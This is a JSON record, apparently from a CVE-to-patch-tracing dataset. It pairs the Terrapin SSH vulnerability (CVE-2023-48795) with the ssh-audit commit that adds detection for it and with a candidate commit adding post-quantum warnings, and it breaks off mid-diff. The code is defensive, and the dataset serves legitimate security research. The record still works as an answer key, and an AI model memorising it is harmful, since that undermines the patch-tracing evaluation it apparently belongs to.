{
  "cve_id": "CVE-2023-48795",
  "cve_desc": "The SSH transport protocol with certain OpenSSH extensions, found in OpenSSH before 9.6 and other products, allows remote attackers to bypass integrity checks such that some packets are omitted (from the extension negotiation message), and a client and server may consequently end up with a connection for which some security features have been downgraded or disabled, aka a Terrapin attack. This occurs because the SSH Binary Packet Protocol (BPP), implemented by these extensions, mishandles the handshake phase and mishandles use of sequence numbers. For example, there is an effective attack against SSH's use of ChaCha20-Poly1305 (and CBC with Encrypt-then-MAC). The bypass occurs in chacha20-poly1305@openssh.com and (if CBC is used) the -etm@openssh.com MAC algorithms. This also affects Maverick Synergy Java SSH API before 3.1.0-SNAPSHOT, Dropbear through 2022.83, Ssh before 5.1.1 in Erlang/OTP, PuTTY before 0.80, AsyncSSH before 2.14.2, golang.org/x/crypto before 0.17.0, libssh before 0.10.6, libssh2 through 1.11.0, Thorn Tech SFTP Gateway before 3.4.6, Tera Term before 5.1, Paramiko before 3.4.0, jsch before 0.2.15, SFTPGo before 2.5.6, Netgate pfSense Plus through 23.09.1, Netgate pfSense CE through 2.7.2, HPN-SSH through 18.2.0, ProFTPD before 1.3.8b (and before 1.3.9rc2), ORYX CycloneSSH before 2.3.4, NetSarang XShell 7 before Build 0144, CrushFTP before 10.6.0, ConnectBot SSH library before 2.2.22, Apache MINA sshd through 2.11.0, sshj through 0.37.0, TinySSH through 20230101, trilead-ssh2 6401, LANCOM LCOS and LANconfig, FileZilla before 3.66.4, Nova before 11.8, PKIX-SSH before 14.4, SecureCRT before 9.4.3, Transmit5 before 5.10.4, Win32-OpenSSH before 9.5.0.0p1-Beta, WinSCP before 6.2.2, Bitvise SSH Server before 9.32, Bitvise SSH Client before 9.33, KiTTY through 0.76.1.13, the net-ssh gem 7.2.0 for Ruby, the mscdex ssh2 module before 1.15.0 for Node.js, the thrussh library before 0.35.1 for Rust, and the Russh crate before 0.40.2 for Rust.",
  "repo": "jtesta/ssh-audit",
  "patch_hash": "8e972c5e94b460379fe0c7d20209c16df81538a5",
  "patch_info": {
    "commit_hash": "8e972c5e94b460379fe0c7d20209c16df81538a5",
    "repo": "jtesta/ssh-audit",
    "commit_url": "https://github.com/jtesta/ssh-audit/commit/8e972c5e94b460379fe0c7d20209c16df81538a5",
    "files": [
      "README.md",
      "src/ssh_audit/ssh2_kexdb.py",
      "src/ssh_audit/ssh_audit.py",
      "test/test_ssh2.py"
    ],
    "message": "Added test for the Terrapin vulnerability (CVE-2023-48795) (#227).",
    "before_after_code_files": [
      "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py",
      "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py",
      "test/test_ssh2.py||test/test_ssh2.py"
    ]
  },
  "patch_diff": {
    "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py": [
      "File: src/ssh_audit/ssh2_kexdb.py -> src/ssh_audit/ssh2_kexdb.py",
      "--- Hunk 1 ---",
      "[Context before]",
      "71:     INFO_REMOVED_IN_OPENSSH69 = 'removed in OpenSSH 6.9: https://www.openssh.com/txt/release-6.9'",
      "72:     INFO_REMOVED_IN_OPENSSH70 = 'removed in OpenSSH 7.0: https://www.openssh.com/txt/release-7.0'",
      "73:     INFO_WITHDRAWN_PQ_ALG = 'the sntrup4591761 algorithm was withdrawn, as it may not provide strong post-quantum security'",
      "75:     # Maintains a dictionary per calling thread that yields its own copy of MASTER_DB.  This prevents results from one thread polluting the results of another thread.",
      "76:     DB_PER_THREAD: Dict[int, Dict[str, Dict[str, List[List[Optional[str]]]]]] = {}",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "74:     INFO_EXTENSION_NEGOTIATION = 'pseudo-algorithm that denotes the peer supports RFC8308 extensions'",
      "75:     INFO_STRICT_KEX = 'pseudo-algorithm that denotes the peer supports a stricter key exchange method as a counter-measure to the Terrapin attack (CVE-2023-48795)'",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "154:             'ecdh-sha2-wiRIU8TKjMZ418sMqlqtvQ==': [[], [FAIL_UNPROVEN]],  # sect283k1",
      "155:             'ecdh-sha2-zD/b3hu/71952ArpUG4OjQ==': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],  # sect233k1",
      "156:             'ecmqv-sha2': [[], [FAIL_UNPROVEN]],",
      "160:             # The GSS kex algorithms get special wildcard handling, since they include variable base64 data after their standard prefixes.",
      "161:             'gss-13.3.132.0.10-sha256-*': [[], [FAIL_UNKNOWN]],",
      "",
      "[Removed Lines]",
      "157:             'ext-info-c': [[]],  # Extension negotiation (RFC 8308)",
      "158:             'ext-info-s': [[]],  # Extension negotiation (RFC 8308)",
      "",
      "[Added Lines]",
      "159:             'ext-info-c': [[], [], [], [INFO_EXTENSION_NEGOTIATION]],  # Extension negotiation (RFC 8308)",
      "160:             'ext-info-s': [[], [], [], [INFO_EXTENSION_NEGOTIATION]],  # Extension negotiation (RFC 8308)",
      "161:             'kex-strict-c-v00@openssh.com': [[], [], [], [INFO_STRICT_KEX]],  # Strict KEX marker (countermeasure for CVE-2023-48795).",
      "162:             'kex-strict-s-v00@openssh.com': [[], [], [], [INFO_STRICT_KEX]],  # Strict KEX marker (countermeasure for CVE-2023-48795).",
      "",
      "---------------"
    ],
    "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py": [
      "File: src/ssh_audit/ssh_audit.py -> src/ssh_audit/ssh_audit.py",
      "--- Hunk 1 ---",
      "[Context before]",
      "447:         out.sep()",
      "451:     '''Perform post-processing on scan results before reporting them to the user.  Returns a list of algorithms that should not be recommended'''",
      "",
      "[Removed Lines]",
      "450: def post_process_findings(banner: Optional[Banner], algs: Algorithms) -> List[str]:",
      "",
      "[Added Lines]",
      "450: def post_process_findings(banner: Optional[Banner], algs: Algorithms, client_audit: bool) -> List[str]:",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "466:         # Ensure that this algorithm doesn't appear in the recommendations section since the user cannot control this OpenSSH bug.",
      "467:         algorithm_recommendation_suppress_list.append('diffie-hellman-group-exchange-sha256')",
      "469:     return algorithm_recommendation_suppress_list",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "469:     # Check for the Terrapin vulnerability (CVE-2023-48795), and mark the vulnerable algorithms.",
      "470:     if algs.ssh2kex is not None and \\",
      "471:        ((client_audit and 'kex-strict-c-v00@openssh.com' not in algs.ssh2kex.kex_algorithms) or (not client_audit and 'kex-strict-s-v00@openssh.com' not in algs.ssh2kex.kex_algorithms)):  # Strict KEX marker is not present.",
      "473:         def add_terrapin_warning(db: Dict[str, Dict[str, List[List[Optional[str]]]]], category: str, algorithm_name: str) -> None:",
      "474:             while len(db[category][algorithm_name]) < 3:",
      "475:                 db[category][algorithm_name].append([])",
      "477:             db[category][algorithm_name][2].append(\"vulnerable to the Terrapin attack (CVE-2023-48795), allowing message prefix truncation\")",
      "479:         db = SSH2_KexDB.get_db()",
      "481:         # Without the strict KEX marker, these algorithms are always vulnerable.",
      "482:         add_terrapin_warning(db, \"enc\", \"chacha20-poly1305\")",
      "483:         add_terrapin_warning(db, \"enc\", \"chacha20-poly1305@openssh.com\")",
      "485:         cbc_ciphers = []",
      "486:         etm_macs = []",
      "488:         # Find the list of CBC ciphers the peer supports.",
      "489:         ciphers_supported = algs.ssh2kex.client.encryption if client_audit else algs.ssh2kex.server.encryption",
      "490:         for cipher in ciphers_supported:",
      "491:             if cipher.endswith(\"-cbc\"):",
      "492:                 cbc_ciphers.append(cipher)",
      "494:         # Find the list of ETM MACs the peer supports.",
      "495:         macs_supported = algs.ssh2kex.client.mac if client_audit else algs.ssh2kex.server.mac",
      "496:         for mac in macs_supported:",
      "497:             if mac.endswith(\"-etm@openssh.com\"):",
      "498:                 etm_macs.append(mac)",
      "500:         # If at least one CBC cipher and at least one ETM MAC is supported, mark them all as vulnerable.",
      "501:         if len(cbc_ciphers) > 0 and len(etm_macs) > 0:",
      "502:             for cipher in cbc_ciphers:",
      "503:                 add_terrapin_warning(db, \"enc\", cipher)",
      "505:             for mac in etm_macs:",
      "506:                 add_terrapin_warning(db, \"mac\", mac)",
      "",
      "---------------",
      "--- Hunk 3 ---",
      "[Context before]",
      "478:     algs = Algorithms(pkm, kex)",
      "480:     # Perform post-processing on the findings to make final adjustments before outputting the results.",
      "483:     with out:",
      "484:         if print_target:",
      "",
      "[Removed Lines]",
      "481:     algorithm_recommendation_suppress_list = post_process_findings(banner, algs)",
      "",
      "[Added Lines]",
      "520:     algorithm_recommendation_suppress_list = post_process_findings(banner, algs, client_audit)",
      "",
      "---------------"
    ],
    "test/test_ssh2.py||test/test_ssh2.py": [
      "File: test/test_ssh2.py -> test/test_ssh2.py",
      "--- Hunk 1 ---",
      "[Context before]",
      "164:         self.audit(out, self._conf())",
      "165:         out.write()",
      "166:         lines = output_spy.flush()",
      "169:     def test_ssh2_server_invalid_first_packet(self, output_spy, virtual_socket):",
      "170:         vsocket = virtual_socket",
      "",
      "[Removed Lines]",
      "167:         assert len(lines) == 70",
      "",
      "[Added Lines]",
      "167:         assert len(lines) == 83",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "28a1e239868b0498330ce37fc151ee8a0d51b1ed",
      "candidate_info": {
        "commit_hash": "28a1e239868b0498330ce37fc151ee8a0d51b1ed",
        "repo": "jtesta/ssh-audit",
        "commit_url": "https://github.com/jtesta/ssh-audit/commit/28a1e239868b0498330ce37fc151ee8a0d51b1ed",
        "files": [
          "README.md",
          "src/ssh_audit/ssh2_kexdb.py",
          "test/docker/expected_results/dropbear_2019.78_test1.json",
          "test/docker/expected_results/dropbear_2019.78_test1.txt",
          "test/docker/expected_results/openssh_4.0p1_test1.json",
          "test/docker/expected_results/openssh_4.0p1_test1.txt",
          "test/docker/expected_results/openssh_5.6p1_test1.json",
          "test/docker/expected_results/openssh_5.6p1_test1.txt",
          "test/docker/expected_results/openssh_5.6p1_test2.json",
          "test/docker/expected_results/openssh_5.6p1_test2.txt",
          "test/docker/expected_results/openssh_5.6p1_test3.json",
          "test/docker/expected_results/openssh_5.6p1_test3.txt",
          "test/docker/expected_results/openssh_5.6p1_test4.json",
          "test/docker/expected_results/openssh_5.6p1_test4.txt",
          "test/docker/expected_results/openssh_5.6p1_test5.json",
          "test/docker/expected_results/openssh_5.6p1_test5.txt",
          "test/docker/expected_results/openssh_8.0p1_test1.json",
          "test/docker/expected_results/openssh_8.0p1_test1.txt",
          "test/docker/expected_results/openssh_8.0p1_test2.json",
          "test/docker/expected_results/openssh_8.0p1_test2.txt",
          "test/docker/expected_results/openssh_8.0p1_test3.json",
          "test/docker/expected_results/openssh_8.0p1_test3.txt",
          "test/docker/expected_results/tinyssh_20190101_test1.json",
          "test/docker/expected_results/tinyssh_20190101_test1.txt",
          "test/test_ssh2.py",
          "test/test_ssh2_kexdb.py"
        ],
        "message": "Added warnings to all key exchanges that do not provide protection against quantum attacks.",
        "before_after_code_files": [
          "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py",
          "test/test_ssh2.py||test/test_ssh2.py",
          "test/test_ssh2_kexdb.py||test/test_ssh2_kexdb.py"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py",
            "test/test_ssh2.py||test/test_ssh2.py"
          ],
          "candidate": [
            "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py",
            "test/test_ssh2.py||test/test_ssh2.py"
          ]
        }
      },
      "candidate_diff": {
        "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py": [
          "File: src/ssh_audit/ssh2_kexdb.py -> src/ssh_audit/ssh2_kexdb.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "57:     WARN_CIPHER_MODE = 'using weak cipher mode'",
          "58:     WARN_ENCRYPT_AND_MAC = 'using encrypt-and-MAC mode'",
          "59:     WARN_EXPERIMENTAL = 'using experimental algorithm'",
          "60:     WARN_RNDSIG_KEY = 'using weak random number generator could reveal the key'",
          "61:     WARN_TAG_SIZE = 'using small 64-bit tag size'",
          "62:     WARN_TAG_SIZE_96 = 'using small 96-bit tag size'",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "60:     WARN_NOT_PQ_SAFE = 'does not provide protection against post-quantum attacks'",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "84:     MASTER_DB: Dict[str, Dict[str, List[List[Optional[str]]]]] = {",
          "85:         # Format: 'algorithm_name': [['version_first_appeared_in'], [reason_for_failure1, reason_for_failure2, ...], [warning1, warning2, ...], [info1, info2, ...]]",
          "86:         'kex': {",
          "116:             'ecdh-nistp256-kyber-512r3-sha256-d00@openquantumsafe.org': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "117:             'ecdh-nistp384-kyber-768r3-sha384-d00@openquantumsafe.org': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "118:             'ecdh-nistp521-kyber-1024r3-sha512-d00@openquantumsafe.org': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "133:             # Note: the base64 strings, according to draft 6 of RFC5656, is Base64(MD5(DER(OID))).  The final RFC5656 dropped the base64 strings in favor of plain OID concatenation, but apparently some SSH servers implement them anyway.  See: https://datatracker.ietf.org/doc/html/draft-green-secsh-ecc-06#section-9.2",
          "163:             'ext-info-c': [['7.2'], [], [], [INFO_EXTENSION_NEGOTIATION]],  # Extension negotiation (RFC 8308)",
          "164:             'ext-info-s': [['9.6'], [], [], [INFO_EXTENSION_NEGOTIATION]],  # Extension negotiation (RFC 8308)",
          "165:             'kex-strict-c-v00@openssh.com': [[], [], [], [INFO_STRICT_KEX]],  # Strict KEX marker (countermeasure for CVE-2023-48795).",
          "166:             'kex-strict-s-v00@openssh.com': [[], [], [], [INFO_STRICT_KEX]],  # Strict KEX marker (countermeasure for CVE-2023-48795).",
          "168:             # The GSS kex algorithms get special wildcard handling, since they include variable base64 data after their standard prefixes.",
          "194:             'mlkem768x25519-sha256': [['9.9'], [], [], [INFO_HYBRID_PQ_X25519_KEX]],",
          "198:             'sntrup4591761x25519-sha512@tinyssh.org': [['8.0', '8.4'], [], [WARN_EXPERIMENTAL], [INFO_WITHDRAWN_PQ_ALG]],",
          "199:             'sntrup761x25519-sha512': [['9.9'], [], [], [INFO_DEFAULT_OPENSSH_KEX_99, INFO_HYBRID_PQ_X25519_KEX]],",
          "200:             'sntrup761x25519-sha512@openssh.com': [['8.5'], [], [], [INFO_DEFAULT_OPENSSH_KEX_90_TO_98, INFO_HYBRID_PQ_X25519_KEX]],",
          "",
          "[Removed Lines]",
          "87:             'Curve25519SHA256': [[]],",
          "88:             'curve25519-sha256': [['7.4,d2018.76'], [], [], [INFO_DEFAULT_OPENSSH_KEX_74_TO_89]],",
          "89:             'curve25519-sha256@libssh.org': [['6.4,d2013.62,l10.6.0'], [], [], [INFO_DEFAULT_OPENSSH_KEX_65_TO_73]],",
          "90:             'curve448-sha512': [[]],",
          "91:             'curve448-sha512@libssh.org': [[]],",
          "92:             'diffie-hellman-group14-sha1': [['3.9,d0.53,l10.6.0'], [FAIL_SHA1], [WARN_2048BIT_MODULUS]],",
          "93:             'diffie-hellman-group14-sha224@ssh.com': [[]],",
          "94:             'diffie-hellman-group14-sha256': [['7.3,d2016.73'], [], [WARN_2048BIT_MODULUS]],",
          "95:             'diffie-hellman-group14-sha256@ssh.com': [[], [], [WARN_2048BIT_MODULUS]],",
          "96:             'diffie-hellman-group15-sha256': [[]],",
          "97:             'diffie-hellman-group15-sha256@ssh.com': [[]],",
          "98:             'diffie-hellman-group15-sha384@ssh.com': [[]],",
          "99:             'diffie-hellman-group15-sha512': [[]],",
          "100:             'diffie-hellman-group16-sha256': [[]],",
          "101:             'diffie-hellman-group16-sha384@ssh.com': [[]],",
          "102:             'diffie-hellman-group16-sha512': [['7.3,d2016.73']],",
          "103:             'diffie-hellman-group16-sha512@ssh.com': [[]],",
          "104:             'diffie-hellman-group17-sha512': [[]],",
          "105:             'diffie-hellman_group17-sha512': [[]],",
          "106:             'diffie-hellman-group18-sha512': [['7.3']],",
          "107:             'diffie-hellman-group18-sha512@ssh.com': [[]],",
          "108:             'diffie-hellman-group1-sha1': [['2.3.0,d0.28,l10.2', '6.6', '6.9'], [FAIL_1024BIT_MODULUS, FAIL_LOGJAM_ATTACK, FAIL_SHA1], [], [INFO_REMOVED_IN_OPENSSH69]],",
          "109:             'diffie-hellman-group1-sha256': [[], [FAIL_1024BIT_MODULUS]],",
          "110:             'diffie-hellman-group-exchange-sha1': [['2.3.0', '6.6', None], [FAIL_SHA1]],",
          "111:             'diffie-hellman-group-exchange-sha224@ssh.com': [[]],",
          "112:             'diffie-hellman-group-exchange-sha256': [['4.4']],",
          "113:             'diffie-hellman-group-exchange-sha256@ssh.com': [[]],",
          "114:             'diffie-hellman-group-exchange-sha384@ssh.com': [[]],",
          "115:             'diffie-hellman-group-exchange-sha512@ssh.com': [[]],",
          "119:             'ecdh-sha2-1.2.840.10045.3.1.1': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-192 / secp192r1",
          "120:             'ecdh-sha2-1.2.840.10045.3.1.7': [[], [FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-256 / secp256r1",
          "121:             'ecdh-sha2-1.3.132.0.10': [[]],  # ECDH over secp256k1 (i.e.: the Bitcoin curve)",
          "122:             'ecdh-sha2-1.3.132.0.16': [[], [FAIL_UNPROVEN]],  # sect283k1",
          "123:             'ecdh-sha2-1.3.132.0.1': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],  # sect163k1",
          "124:             'ecdh-sha2-1.3.132.0.26': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],  # sect233k1",
          "125:             'ecdh-sha2-1.3.132.0.27': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE]],  # sect233r1",
          "126:             'ecdh-sha2-1.3.132.0.33': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-224 / secp224r1",
          "127:             'ecdh-sha2-1.3.132.0.34': [[], [FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-384 / secp384r1",
          "128:             'ecdh-sha2-1.3.132.0.35': [[], [FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-521 / secp521r1",
          "129:             'ecdh-sha2-1.3.132.0.36': [[], [FAIL_UNPROVEN]],  # sect409k1",
          "130:             'ecdh-sha2-1.3.132.0.37': [[], [FAIL_NSA_BACKDOORED_CURVE]],  # sect409r1",
          "131:             'ecdh-sha2-1.3.132.0.38': [[], [FAIL_UNPROVEN]],  # sect571k1",
          "134:             'ecdh-sha2-4MHB+NBt3AlaSRQ7MnB4cg==': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],  # sect163k1",
          "135:             'ecdh-sha2-5pPrSUQtIaTjUSt5VZNBjg==': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-192 / secp192r1",
          "136:             'ecdh-sha2-9UzNcgwTlEnSCECZa7V1mw==': [[], [FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-256 / secp256r1",
          "137:             'ecdh-sha2-brainpoolp256r1@genua.de': [[], [FAIL_UNPROVEN]],",
          "138:             'ecdh-sha2-brainpoolp384r1@genua.de': [[], [FAIL_UNPROVEN]],",
          "139:             'ecdh-sha2-brainpoolp521r1@genua.de': [[], [FAIL_UNPROVEN]],",
          "140:             'ecdh-sha2-curve25519': [[], []],",
          "141:             'ecdh-sha2-D3FefCjYoJ/kfXgAyLddYA==': [[], [FAIL_NSA_BACKDOORED_CURVE]],  # sect409r1",
          "142:             'ecdh-sha2-h/SsxnLCtRBh7I9ATyeB3A==': [[], [FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-521 / secp521r1",
          "143:             'ecdh-sha2-m/FtSAmrV4j/Wy6RVUaK7A==': [[], [FAIL_UNPROVEN]],  # sect409k1",
          "144:             'ecdh-sha2-mNVwCXAoS1HGmHpLvBC94w==': [[], [FAIL_UNPROVEN]],  # sect571k1",
          "145:             'ecdh-sha2-nistb233': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],",
          "146:             'ecdh-sha2-nistb409': [[], [FAIL_UNPROVEN]],",
          "147:             'ecdh-sha2-nistk163': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],",
          "148:             'ecdh-sha2-nistk233': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],",
          "149:             'ecdh-sha2-nistk283': [[], [FAIL_UNPROVEN]],",
          "150:             'ecdh-sha2-nistk409': [[], [FAIL_UNPROVEN]],",
          "151:             'ecdh-sha2-nistp192': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "152:             'ecdh-sha2-nistp224': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "153:             'ecdh-sha2-nistp256': [['5.7,d2013.62,l10.6.0'], [FAIL_NSA_BACKDOORED_CURVE]],",
          "154:             'ecdh-sha2-nistp384': [['5.7,d2013.62'], [FAIL_NSA_BACKDOORED_CURVE]],",
          "155:             'ecdh-sha2-nistp521': [['5.7,d2013.62'], [FAIL_NSA_BACKDOORED_CURVE]],",
          "156:             'ecdh-sha2-nistt571': [[], [FAIL_UNPROVEN]],",
          "157:             'ecdh-sha2-qCbG5Cn/jjsZ7nBeR7EnOA==': [[FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE]],  # sect233r1",
          "158:             'ecdh-sha2-qcFQaMAMGhTziMT0z+Tuzw==': [[], [FAIL_NSA_BACKDOORED_CURVE]],  # NIST P-384 / secp384r1",
          "159:             'ecdh-sha2-VqBg4QRPjxx1EXZdV0GdWQ==': [[], [FAIL_NSA_BACKDOORED_CURVE, FAIL_SMALL_ECC_MODULUS]],  # NIST P-224 / secp224r1",
          "160:             'ecdh-sha2-wiRIU8TKjMZ418sMqlqtvQ==': [[], [FAIL_UNPROVEN]],  # sect283k1",
          "161:             'ecdh-sha2-zD/b3hu/71952ArpUG4OjQ==': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],  # sect233k1",
          "162:             'ecmqv-sha2': [[], [FAIL_UNPROVEN]],",
          "169:             'gss-13.3.132.0.10-sha256-*': [[], [FAIL_UNKNOWN]],",
          "170:             'gss-curve25519-sha256-*': [[]],",
          "171:             'gss-curve448-sha512-*': [[]],",
          "172:             'gss-gex-sha1-*': [[], [FAIL_SHA1]],",
          "173:             'gss-gex-sha256-*': [[]],",
          "174:             'gss-group14-sha1-*': [[], [FAIL_SHA1], [WARN_2048BIT_MODULUS]],",
          "175:             'gss-group14-sha256-*': [[], [], [WARN_2048BIT_MODULUS]],",
          "176:             'gss-group15-sha512-*': [[]],",
          "177:             'gss-group16-sha512-*': [[]],",
          "178:             'gss-group17-sha512-*': [[]],",
          "179:             'gss-group18-sha512-*': [[]],",
          "180:             'gss-group1-sha1-*': [[], [FAIL_1024BIT_MODULUS, FAIL_LOGJAM_ATTACK, FAIL_SHA1]],",
          "181:             'gss-nistp256-sha256-*': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "182:             'gss-nistp384-sha256-*': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "183:             'gss-nistp384-sha384-*': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "184:             'gss-nistp521-sha512-*': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "185:             'kexAlgoCurve25519SHA256': [[]],",
          "186:             'kexAlgoDH14SHA1': [[], [FAIL_SHA1], [WARN_2048BIT_MODULUS]],",
          "187:             'kexAlgoDH1SHA1': [[], [FAIL_1024BIT_MODULUS, FAIL_LOGJAM_ATTACK, FAIL_SHA1]],",
          "188:             'kexAlgoECDH256': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "189:             'kexAlgoECDH384': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "190:             'kexAlgoECDH521': [[], [FAIL_NSA_BACKDOORED_CURVE]],",
          "191:             'kexguess2@matt.ucc.asn.au': [['d2013.57']],",
          "192:             'm383-sha384@libassh.org': [[], [FAIL_UNPROVEN]],",
          "193:             'm511-sha512@libassh.org': [[], [FAIL_UNPROVEN]],",
          "195:             'rsa1024-sha1': [[], [FAIL_1024BIT_MODULUS, FAIL_SHA1]],",
          "196:             'rsa2048-sha256': [[], [], [WARN_2048BIT_MODULUS]],",
          "197:             'sm2kep-sha2-nistp256': [[], [FAIL_NSA_BACKDOORED_CURVE, FAIL_UNTRUSTED]],",
          "",
          "[Added Lines]",
          "88:             'Curve25519SHA256': [[], [], [WARN_NOT_PQ_SAFE]],",
          "89:             'curve25519-sha256': [['7.4,d2018.76'], [], [WARN_NOT_PQ_SAFE], [INFO_DEFAULT_OPENSSH_KEX_74_TO_89]],",
          "90:             'curve25519-sha256@libssh.org': [['6.4,d2013.62,l10.6.0'], [], [WARN_NOT_PQ_SAFE], [INFO_DEFAULT_OPENSSH_KEX_65_TO_73]],",
          "91:             'curve448-sha512': [[], [], [WARN_NOT_PQ_SAFE]],",
          "92:             'curve448-sha512@libssh.org': [[], [], [WARN_NOT_PQ_SAFE]],",
          "93:             'diffie-hellman-group14-sha1': [['3.9,d0.53,l10.6.0'], [FAIL_SHA1], [WARN_2048BIT_MODULUS, WARN_NOT_PQ_SAFE]],",
          "94:             'diffie-hellman-group14-sha224@ssh.com': [[], [], [WARN_2048BIT_MODULUS, WARN_NOT_PQ_SAFE]],",
          "95:             'diffie-hellman-group14-sha256': [['7.3,d2016.73'], [], [WARN_2048BIT_MODULUS, WARN_NOT_PQ_SAFE]],",
          "96:             'diffie-hellman-group14-sha256@ssh.com': [[], [], [WARN_2048BIT_MODULUS, WARN_NOT_PQ_SAFE]],",
          "97:             'diffie-hellman-group15-sha256': [[], [], [WARN_NOT_PQ_SAFE]],",
          "98:             'diffie-hellman-group15-sha256@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "99:             'diffie-hellman-group15-sha384@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "100:             'diffie-hellman-group15-sha512': [[], [], [WARN_NOT_PQ_SAFE]],",
          "101:             'diffie-hellman-group16-sha256': [[], [], [WARN_NOT_PQ_SAFE]],",
          "102:             'diffie-hellman-group16-sha384@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "103:             'diffie-hellman-group16-sha512': [['7.3,d2016.73'], [], [WARN_NOT_PQ_SAFE]],",
          "104:             'diffie-hellman-group16-sha512@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "105:             'diffie-hellman-group17-sha512': [[], [], [WARN_NOT_PQ_SAFE]],",
          "106:             'diffie-hellman_group17-sha512': [[], [], [WARN_NOT_PQ_SAFE]],",
          "107:             'diffie-hellman-group18-sha512': [['7.3'], [], [WARN_NOT_PQ_SAFE]],",
          "108:             'diffie-hellman-group18-sha512@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "109:             'diffie-hellman-group1-sha1': [['2.3.0,d0.28,l10.2', '6.6', '6.9'], [FAIL_1024BIT_MODULUS, FAIL_LOGJAM_ATTACK, FAIL_SHA1], [WARN_NOT_PQ_SAFE], [INFO_REMOVED_IN_OPENSSH69]],",
          "110:             'diffie-hellman-group1-sha256': [[], [FAIL_1024BIT_MODULUS], [WARN_NOT_PQ_SAFE]],",
          "111:             'diffie-hellman-group-exchange-sha1': [['2.3.0', '6.6', None], [FAIL_SHA1], [WARN_NOT_PQ_SAFE]],",
          "112:             'diffie-hellman-group-exchange-sha224@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "113:             'diffie-hellman-group-exchange-sha256': [['4.4'], [], [WARN_NOT_PQ_SAFE]],",
          "114:             'diffie-hellman-group-exchange-sha256@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "115:             'diffie-hellman-group-exchange-sha384@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "116:             'diffie-hellman-group-exchange-sha512@ssh.com': [[], [], [WARN_NOT_PQ_SAFE]],",
          "120:             'ecdh-sha2-1.2.840.10045.3.1.1': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-192 / secp192r1",
          "121:             'ecdh-sha2-1.2.840.10045.3.1.7': [[], [FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # NIST P-256 / secp256r1",
          "122:             'ecdh-sha2-1.3.132.0.10': [[], [], [WARN_NOT_PQ_SAFE]],  # ECDH over secp256k1 (i.e.: the Bitcoin curve)",
          "123:             'ecdh-sha2-1.3.132.0.16': [[], [FAIL_UNPROVEN], [WARN_NOT_PQ_SAFE]],  # sect283k1",
          "124:             'ecdh-sha2-1.3.132.0.1': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS], [WARN_NOT_PQ_SAFE]],  # sect163k1",
          "125:             'ecdh-sha2-1.3.132.0.26': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS], [WARN_NOT_PQ_SAFE]],  # sect233k1",
          "126:             'ecdh-sha2-1.3.132.0.27': [[], [FAIL_SMALL_ECC_MODULUS, FAIL_NSA_BACKDOORED_CURVE], [WARN_NOT_PQ_SAFE]],  # sect233r1",
